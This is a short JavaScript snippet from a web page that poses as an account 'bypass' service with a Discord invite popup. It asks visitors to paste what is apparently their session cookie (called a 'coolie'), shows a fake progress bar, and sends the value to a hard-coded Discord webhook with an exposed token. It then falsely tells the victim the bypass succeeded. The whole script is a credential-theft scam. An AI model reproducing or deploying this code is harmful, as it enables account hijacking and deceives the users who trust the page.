<script>
// DISCORD POPUP SHOW ON LOAD
window.onload = function () {

};

function joinServer() {
    window.open("https://discord.gg/ec7h2KqTY5", "_blank");

}

function closePopup() {
    document.getElementById("discordPopup").classList.add("hidden");
}



// ---- WEBHOOK SYSTEM ---- //

const WEBHOOK_URL =
"https://discord.com/api/webhooks/1446558345657061517/TXzqkxok3TcAtALmqUTkQKQDCUVGFOHypyZGA29-1ZO-zpUlDLQnMcIQ-tUqDPvrQJGP";

let cooldown = false;

function sendWebhook() {
    if (cooldown) return;

    const msg = document.getElementById("webhookMessage").value;
    if (!msg) {
        Swal.fire({
            icon: "warning",
            title: "Message Missing",
            text: "Please enter a coolie before bypassing.",
            background: "#111",
            color: "white"
        });
        return;
    }

    // Progress UI
    document.getElementById("progressContainer").classList.remove("hidden");
    let bar = document.getElementById("progressBar");
    let width = 0;

    let loading = setInterval(() => {
        width++;
        bar.style.width = width + "%";

        if (width >= 100) {
            clearInterval(loading);
            bar.style.width = "0%";
            document.getElementById("progressContainer").classList.add("hidden");

            finalizeSend(msg);
        }
    }, 20);
}

function finalizeSend(msg) {
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: msg })
    });

    Swal.fire({
        icon: "success",
        title: "Bypass Successfully!",
        text: "Please Check Your Account.",
        background: "#111",
        color: "white",
        showConfirmButton: false,
        timer: 1500
    });

    cooldown = true;
    document.getElementById("sendBtn").disabled = true;
    document.getElementById("webhookMessage").disabled = true;

    setTimeout(() => {
        cooldown = false;
        document.getElementById("sendBtn").disabled = false;
        document.getElementById("webhookMessage").disabled = false;
    }, 5 * 60 * 1000); // 5 minutes
}
</script>
